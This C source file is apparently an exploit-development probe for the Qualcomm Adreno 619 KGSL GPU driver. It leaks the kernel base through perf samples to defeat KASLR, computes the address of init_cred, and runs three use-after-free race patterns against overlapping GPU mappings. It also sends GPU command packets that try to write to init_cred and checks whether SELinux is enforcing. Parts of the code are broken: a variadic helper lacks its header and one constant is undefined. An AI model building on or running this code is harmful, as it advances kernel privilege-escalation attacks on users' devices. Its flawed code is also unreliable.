#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/stat.h>
#include <time.h>
#include <signal.h>

/* ========================== KGSL ioctl definitions ========================== */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0x1000
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define SPRAY_PIDS 2000
#define VMLINUX_TEXT 0xffffffc010080000ULL
#define VMLINUX_INIT_CRED_OFFSET 0x26fa738

/* ========================== PM4 opcodes ========================== */
#define CP_NOP         0x10
#define CP_MEM_WRITE   0x3D
#define CP_REG_TO_MEM  0x3E
#define CP_MEM_TO_REG  0x42
#define CP_WAIT_REG_MEM 0x3C
#define CP_INDIRECT_BUFFER_PFD 0x37 /* type3 */

/* ========================== Global state ========================== */
static int kgsl_fd = -1;
static int verbose = 2;
static uint64_t kaslr = 0;
static uint64_t init_cred_addr = 0;

static void die(const char *msg) { perror(msg); exit(1); }
static void debug(int lvl, const char *fmt, ...) {
    if (lvl > verbose) return;
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
}

/* ========================== PM4 helpers ========================== */
static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

static uint32_t cp_type3(uint32_t opcode, uint32_t cnt) {
    return (3<<30) | ((cnt-1)<<16) | (opcode<<8);
}

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

/* ========================== KGSL wrappers ========================== */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
        debug(0, "  gpuobj_alloc(%llx,%llx) failed: errno=%d\n", size, flags, errno);
        return -1;
    }
    return a.id;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0)
        debug(0, "  gpuobj_free(%u) failed: errno=%d\n", id, errno);
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED)
        debug(0, "  gpuobj_mmap(%zu,%u) failed: errno=%d\n", size, id, errno);
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) {
        if (gpuaddr) *gpuaddr = inf.gpuaddr;
        if (flags) *flags = inf.flags;
    } else {
        debug(0, "  gpuobj_info(%u) failed: errno=%d\n", id, errno);
    }
    return ret;
}

static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

/* ========================== Run a command sequence ========================== */
static int run_cmd(uint32_t *cmd, int dwords,
                   uint64_t ib_ga, void *ib_m,
                   unsigned int ctx_id, unsigned int ib_id) {
    memcpy(ib_m, cmd, dwords * 4);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx_id, ib_ga, dwords * 4, ib_id, &ts) < 0) return -1;
    if (wait_timestamp(ctx_id, ts) < 0) return -2;
    __sync_synchronize();
    return 0;
}

/* ========================== KASLR detection via perf ========================== */
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ========================== dc civac test ========================== */
static volatile int dc_civac_works = -1;
static void sigill_handler(int sig) { dc_civac_works = 0; }

static void try_dc_civac(void *addr) {
    if (dc_civac_works == 0) return;
    void *old = signal(SIGILL, sigill_handler);
    __sync_synchronize();
    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
    asm volatile("dsb sy" : : : "memory");
    __sync_synchronize();
    signal(SIGILL, old);
    if (dc_civac_works == -1) dc_civac_works = 1;
}

static void flush_dc_civac_range(void *start, size_t len) {
    if (dc_civac_works != 1) return;
    char *p = (char*)((uintptr_t)start & ~63);
    char *end = (char*)((uintptr_t)start + len);
    for (; p < end; p += 64) try_dc_civac(p);
}

/* ========================== Test: IMPORT parameters ========================== */
static void test_import_params(void) {
    printf("\n[*] Testing KGSL_GPUOBJ_IMPORT parameters\n");
    uint64_t user_buf[2] = {0x123456789ABCDEF0ULL, 0xFEDCBA9876543210ULL};
    uint64_t addrs[] = {
        (uint64_t)(uintptr_t)user_buf,
        (uint64_t)(uintptr_t)(((uintptr_t)user_buf + 0xFFF) & ~0xFFFULL),
        (uint64_t)(uintptr_t)user_buf,
        (uint64_t)(uintptr_t)user_buf
    };
    size_t sizes[] = {sizeof(user_buf), 0x1000, 0x1000, 0x1000};
    uint64_t flags[] = {KGSL_MEMFLAGS_USE_CPU_MAP, KGSL_MEMFLAGS_USE_CPU_MAP, 0, 0};
    int types[] = {KGSL_USER_MEM_TYPE_ADDR, KGSL_USER_MEM_TYPE_ADDR, KGSL_USER_MEM_TYPE_ADDR, KGSL_USER_MEM_TYPE_DMABUF};

    for (int i = 0; i < 4; i++) {
        struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = addrs[i] };
        struct kgsl_gpuobj_import imp = {
            .priv = (uint64_t)&uaddr,
            .priv_len = sizes[i],
            .flags = flags[i],
            .type = types[i],
        };
        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
        printf("  test%d: addr=0x%lx size=%zu flags=0x%llx type=%d => ret=%d errno=%d",
               i, addrs[i], sizes[i], flags[i], types[i], ret, ret<0?errno:0);
        if (ret == 0) {
            printf(" id=%u\n", imp.id);
            gpuobj_free(imp.id);
        } else {
            printf("\n");
        }
    }
}

/* ========================== Test: PM4 packet operations ========================== */
static void test_pm4_packets(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *dst_m,
                             unsigned int ctx_id, unsigned int ib_id) {
    printf("\n[*] Testing PM4 packets\n");

    /* 1. CP_MEM_WRITE */
    printf("  CP_MEM_WRITE: ");
    uint64_t test_val = 0xCAFEBABEDEADBEEFULL;
    uint32_t cmd[16];
    int dw = 0;
    uint32_t lo, hi;
    split64(dst_ga, &lo, &hi);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    split64(test_val, &lo, &hi);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    memset(dst_m, 0, 16);
    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
        flush_dc_civac_range(dst_m, 16);
        uint64_t got = *(uint64_t*)dst_m;
        printf("got=0x%016lx %s\n", got, got==test_val ? "[OK]" : "[FAIL]");
    } else {
        printf("failed\n");
    }

    /* 2. CP_REG_TO_MEM - test known registers */
    printf("  CP_REG_TO_MEM: ");
    uint32_t regs[] = {0x00000400, 0x00000404, 0x00000408, 0x0000040C, 0x00000410};
    for (int i = 0; i < 5; i++) {
        dw = 0;
        split64(dst_ga, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
        cmd[dw++] = regs[i];
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        memset(dst_m, 0, 16);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
            flush_dc_civac_range(dst_m, 16);
            uint64_t val = *(uint64_t*)dst_m;
            printf("reg=0x%04x => 0x%016lx ", regs[i], val);
        } else {
            printf("reg=0x%04x => failed ", regs[i]);
        }
    }
    printf("\n");

    /* 3. CP_MEM_TO_REG */
    printf("  CP_MEM_TO_REG: ");
    uint32_t reg_wr = 0x00000408;
    split64(dst_ga, &lo, &hi);
    dw = 0;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_TO_REG, 4);
    cmd[dw++] = reg_wr;
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
        printf("wrote dst_ga to reg=0x%04x ", reg_wr);
        // read back to verify
        dw = 0;
        split64(dst_ga + 8, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
        cmd[dw++] = reg_wr;
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        memset(dst_m, 0, 16);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
            flush_dc_civac_range(dst_m, 16);
            uint64_t val = *(uint64_t*)(dst_m + 8);
            printf("readback=0x%016lx %s\n", val, val != 0 ? "[READABLE]" : "[ZERO]");
        } else {
            printf("readback failed\n");
        }
    } else {
        printf("failed\n");
    }

    /* 4. CP_WAIT_REG_MEM */
    printf("  CP_WAIT_REG_MEM: ");
    // first write a known value to dst_ga
    dw = 0;
    split64(dst_ga, &lo, &hi);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = 0x12345678; cmd[dw++] = 0;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
        dw = 0;
        split64(dst_ga, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_WAIT_REG_MEM, 6);
        cmd[dw++] = 0x00000400;          // reg
        cmd[dw++] = lo; cmd[dw++] = hi;  // mem addr
        cmd[dw++] = 0x12345678;          // value
        cmd[dw++] = 0x12345678;          // mask
        cmd[dw++] = 0;                   // ?
        cmd[dw++] = cp_type7(CP_NOP, 0);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
            printf("ok (waited for value)\n");
        } else {
            printf("failed (timeout?)\n");
        }
    } else {
        printf("failed (could not write test value)\n");
    }
}

/* ========================== Test: UAF race patterns ========================== */
static volatile int race_done = 0;
static void *race_thread_import(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = BOGUS_SIZE,
        .flags = 0,                      // no USE_CPU_MAP
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) {
        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
        usleep(50);
    }
    return NULL;
}

static void *race_thread_alloc(void *arg) {
    while (!race_done) {
        int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
        if (id >= 0) gpuobj_free(id);
        usleep(50);
    }
    return NULL;
}

static void *race_thread_mmap(void *arg) {
    int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    while (!race_done) {
        void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
        if (p != MAP_FAILED) munmap(p, 0x1000);
        usleep(50);
    }
    gpuobj_free(id);
    return NULL;
}

static int run_race_pattern(int pattern, uint64_t alloc_flags) {
    pthread_t thr;
    race_done = 0;
    int hit = 0;
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    if (ov_id < 0) return 0;
    uint64_t ov_gpuaddr = 0;
    gpuobj_info(ov_id, &ov_gpuaddr, NULL);
    printf("  pattern %d: ov_id=%d ov_gpuaddr=0x%lx\n", pattern, ov_id, ov_gpuaddr);

    switch(pattern) {
        case 0: pthread_create(&thr, NULL, race_thread_import, NULL); break;
        case 1: pthread_create(&thr, NULL, race_thread_alloc, NULL); break;
        case 2: pthread_create(&thr, NULL, race_thread_mmap, NULL); break;
        default: pthread_create(&thr, NULL, race_thread_import, NULL); break;
    }

    for (int i = 0; i < 5000000 && !hit; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 1000000 == 0 && i > 0) {
            printf("    race %d/5000000 errno=%d\n", i, e);
        }
    }

    race_done = 1;
    pthread_join(thr, NULL);
    gpuobj_free(ov_id);
    return hit;
}

/* ========================== Main ========================== */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("=== KGSL/Adreno 619 Low-Level Analyzer ===\n");

    struct utsname u;
    uname(&u);
    printf("System: %s %s %s\n", u.sysname, u.nodename, u.release);

    /* Open KGSL device */
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    /* Detect KASLR */
    kaslr = detect_kaslr();
    if (!kaslr) {
        printf("[-] KASLR detection failed\n");
        close(kgsl_fd);
        return 1;
    }
    printf("[+] KASLR = 0x%lx\n", kaslr);
    init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
    printf("[*] init_cred = 0x%lx\n", init_cred_addr);

    /* Test dc civac */
    try_dc_civac((void*)&kgsl_fd);
    printf("[*] dc civac: %s\n", dc_civac_works == 1 ? "works" : (dc_civac_works == 0 ? "not supported" : "unknown"));

    /* Allocate basic objects */
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    if (ib_id < 0) die("ib alloc");
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    if (!ib_m) die("ib mmap");
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga, NULL);
    printf("[*] IB: id=%d gpuaddr=0x%lx\n", ib_id, ib_ga);

    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
    if (dst_id < 0) die("dst alloc");
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    if (!dst_m) die("dst mmap");
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga, NULL);
    printf("[*] DST: id=%d gpuaddr=0x%lx\n", dst_id, dst_ga);

    unsigned int ctx_id = create_context();
    printf("[*] Context: %u\n", ctx_id);

    /* 1. IMPORT tests */
    test_import_params();

    /* 2. PM4 packet tests */
    test_pm4_packets(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);

    /* 3. UAF race tests */
    printf("\n[*] Testing UAF race patterns\n");
    for (int p = 0; p < 3; p++) {
        printf("  pattern %d: ", p);
        int won = run_race_pattern(p, alloc_flags);
        printf("  %s\n", won ? "WON" : "LOST");
    }

    /* 4. Try to write to init_cred directly (will likely fail, but test) */
    printf("\n[*] Attempting direct write to init_cred (expect failure)\n");
    uint64_t test_write_addr = init_cred_addr;
    uint32_t cmd[16];
    int dw = 0;
    uint32_t lo, hi;
    split64(test_write_addr, &lo, &hi);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = 0xDEADBEEF; cmd[dw++] = 0xCAFEBABE;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
        printf("  write succeeded (but likely ignored/faulted)\n");
    } else {
        printf("  write failed (expected)\n");
    }

    /* 5. Check if /sys/fs/selinux/enforce is writable */
    printf("\n[*] SELinux enforce status: ");
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char c;
        if (read(fd, &c, 1) == 1) printf("%c\n", c);
        else printf("unknown\n");
        close(fd);
    } else {
        printf("unreadable\n");
    }

    printf("\n[*] Analyzer finished.\n");
    close(kgsl_fd);
    return 0;
}
